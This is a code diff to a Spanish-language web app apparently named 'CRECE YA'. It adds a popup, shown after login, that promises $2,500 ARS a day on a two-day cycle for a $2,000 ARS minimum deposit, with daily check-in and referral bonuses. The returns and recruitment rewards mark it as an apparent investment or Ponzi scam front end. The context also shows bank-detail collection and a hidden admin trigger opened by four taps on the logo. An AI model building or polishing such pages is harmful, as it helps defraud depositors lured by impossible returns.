@@ -62,6 +62,50 @@
 </head>
 <body class="bg-[#bae6fd] text-slate-850 antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
 
+  <!-- ================= ANUNCIO EMERGENTE OFICIAL (POPUP) ================= -->
+  <div id="notice-modal" class="fixed inset-0 z-50 bg-[#020813]/85 backdrop-blur-md hidden flex items-center justify-center p-4">
+    <div class="card-theme bg-white border border-sky-300 w-full max-w-sm rounded-3xl p-6 shadow-2xl space-y-4 text-slate-850 relative">
+      
+      <div class="text-center space-y-2">
+        <div class="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-sky-100 border border-sky-200 text-sky-600 text-2xl shadow-xs">
+          <i class="fa-solid fa-bullhorn"></i>
+        </div>
+        <h3 class="text-base font-black tracking-wide text-slate-900 text-main">AVISO OFICIAL CRECE YA</h3>
+      </div>
+
+      <div class="subbox-theme bg-slate-50 border border-sky-100 rounded-2xl p-4 space-y-2.5 text-xs font-mono">
+        <div class="flex items-center gap-2.5">
+          <span class="text-base shrink-0">🔥</span>
+          <p><strong class="text-amber-500">Plan MELI:</strong> $2.500 ARS diarios</p>
+        </div>
+        <div class="flex items-center gap-2.5">
+          <span class="text-base shrink-0">⏱️</span>
+          <p><strong class="text-sky-600">Duración ágil:</strong> 2 días de ciclo</p>
+        </div>
+        <div class="flex items-center gap-2.5">
+          <span class="text-base shrink-0">💵</span>
+          <p><strong class="text-emerald-600">Depósito mínimo:</strong> $2.000 ARS</p>
+        </div>
+        <div class="flex items-center gap-2.5">
+          <span class="text-base shrink-0">🎁</span>
+          <p><strong class="text-amber-600">Check-in diario:</strong> +$500 ARS / día</p>
+        </div>
+        <div class="flex items-center gap-2.5">
+          <span class="text-base shrink-0">👥</span>
+          <p><strong class="text-sky-700">Bono por invitados:</strong> Desde +$1.000 ARS</p>
+        </div>
+        <div class="flex items-center gap-2.5">
+          <span class="text-base shrink-0">🏛️</span>
+          <p><strong class="text-slate-600 text-sub">Horario bancario:</strong> Lun a Vie 07:00 a 18:00 hs</p>
+        </div>
+      </div>
+
+      <button onclick="closeNoticeModal()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow-md cursor-pointer">
+        ENTENDIDO / OK
+      </button>
+    </div>
+  </div>
+
   <!-- PANTALLA DE ACCESO (REGISTRO / LOGIN DINÁMICO) -->
   <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
@@ -645,6 +689,11 @@
       if (el) el.innerText = currentCaptcha;
     }
 
+    // MODAL DE AVISO OFICIAL
+    window.closeNoticeModal = function() {
+      document.getElementById('notice-modal').classList.add('hidden');
+    };
+
     function checkAuth() {
       const authScreen = document.getElementById('auth-screen');
       if (appState.phone && appState.pass) {
@@ -652,6 +701,9 @@
         document.getElementById('user-display-phone').innerText = appState.phone;
         sincronizarSaldoServidor();
         renderUI();
+        
+        // Mostrar aviso oficial si ya ingresó
+        document.getElementById('notice-modal').classList.remove('hidden');
       } else {
         generateCaptcha();
         if (authScreen) authScreen.style.display = 'flex';
@@ -722,6 +774,9 @@
       if (authScreen) authScreen.remove();
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
+
+      // Abrir aviso popup oficial al ingresar
+      document.getElementById('notice-modal').classList.remove('hidden');
 
       supabaseRequest('usuarios', 'POST', {
         phone: phone,
@@ -1073,6 +1128,7 @@
       alert("Datos bancarios guardados.");
     });
 
+    // DETECTOR 4 TOQUES EN EL LOGO
     let logoClicks = 0;
     document.getElementById('admin-logo-trigger').addEventListener('click', () => {
       logoClicks++;
